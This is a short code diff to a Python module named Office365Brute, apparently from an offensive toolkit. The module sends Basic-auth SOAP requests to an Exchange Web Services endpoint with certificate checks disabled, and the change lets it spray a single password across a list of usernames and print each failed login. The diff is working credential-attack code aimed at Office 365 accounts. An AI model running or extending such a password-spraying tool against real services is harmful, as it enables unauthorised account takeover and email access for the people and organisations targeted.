@@ -87,12 +87,12 @@ class Office365Brute(webModule):
             </FindItem>
             </soap:Body>
             </soap:Envelope>""".format()
-        auth = base64.encodestring("%s:%s" % (config["USERNAME"], config["PASSWORD"])).replace('\n', '')
+        auth = base64.encodestring("%s:%s" % (user, config["PASSWORD"])).replace('\n', '')
         with session() as c:
             requests.packages.urllib3.disable_warnings()
             c.headers.update({"Host": host,
                 "Content-Type": "text/xml; charset=UTF-8",
-                "Content-Length": len(payload),
+                "Content-Length": str(len(payload)),
                 "Authorization": "Basic %s" % auth})
             resp1 = c.post(config["HOST"] + "/ews/Exchange.asmx", data=payload, allow_redirects=True, verify=False, proxies=proxy)
             if "200" in str(resp1):
@@ -103,4 +103,4 @@ class Office365Brute(webModule):
                     data = resp2
                     self.somethingCool(self.term, data, config)
             else:
-                print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
+                print("[-]  Login Failed for: " + user + ":" + config["PASSWORD"])
